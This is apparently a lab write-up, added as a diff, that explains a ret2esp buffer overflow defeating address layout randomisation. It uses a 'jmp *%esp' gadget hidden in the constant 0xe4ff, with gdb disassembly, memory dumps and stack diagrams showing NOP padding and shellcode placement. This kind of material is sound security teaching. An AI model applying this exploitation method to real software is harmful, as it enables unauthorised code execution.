@@ -1,0 +1,67 @@
+For this version of buffer overflow, we needed to account for  the the
+randomization of address layout. The user coded the value of  58623 into their
+local variables. We are able to exploit this through interpreting this value of
+58623 as instruction - namely, ret2esp. Through disassembly, we are able to find
+the value of 58623 (0xe4ff) and locate its address in the text segment of
+memory.
+
+Dump of assembler code for function magic:
+   0x08048604 <+0>:     push   %ebp
+   0x08048605 <+1>:     mov    %esp,%ebp
+   0x08048607 <+3>:     mov    0xc(%ebp),%eax
+   0x0804860a <+6>:     shl    $0x3,%eax
+   0x0804860d <+9>:     xor    %eax,0x8(%ebp)
+   0x08048610 <+12>:    mov    0x8(%ebp),%eax
+   0x08048613 <+15>:    shl    $0x3,%eax
+   0x08048616 <+18>:    xor    %eax,0xc(%ebp)     
+   0x08048619 <+21>:    orl    $0xe4ff,0x8(%ebp)   <---
+   0x08048620 <+28>:    mov    0xc(%ebp),%ecx
+   0x08048623 <+31>:    mov    $0x3e0f83e1,%edx
+   0x08048628 <+36>:    mov    %ecx,%eax
+   0x0804862a <+38>:    mul    %edx
+
+We add three bytes to the instruction to uncover a jump instruction.
+(gdb) x/i 0x0804861C
+   0x804861c <magic+24>:        jmp    *%esp
+
+The program jumps to the esp instruction immediately above it. Therefore,
+finding a return address was not necessary; we just needed to pad NOP
+instructions up to the jmp instruction, in which it will execute the shellcode
+directly above it.
+
+(gdb) x/30x buf + 0x1be8
+0xbffff6d8:    0x90909090       0x0804861c      0xe3f7db31      0x6a534353
+(gdb) x/30x buf + 0x1bd8
+0xbffff6c8:    0xb7fd2000       0xbffff738      0xb7fd2000      0x00000000
+0xbffff6d8:    0xbffff738       0x080488cc      0x00000008      0xbffff704
+
+Stack BEFORE:
+|0x00000008|
+|----------|
+|0x080488cc|<-rip
+|----------|
+|0xbffff738|<-ebp
+|----------|
+|0x00000000|
+|----------|
+|0xb7fd2000|
+|----------|
+|0xbffff738|
+|----------|
+
+Stack AFTER:
+|shellcode |
+|----------|
+|0x804861c |<-rip
+|----------|
+|0x90909090|<-ebp
+|----------|
+|0x90909090|
+|----------|
+|0x90909090|
+|----------|
+|0x90909090|
+|----------|
+     .
+     .
+     .
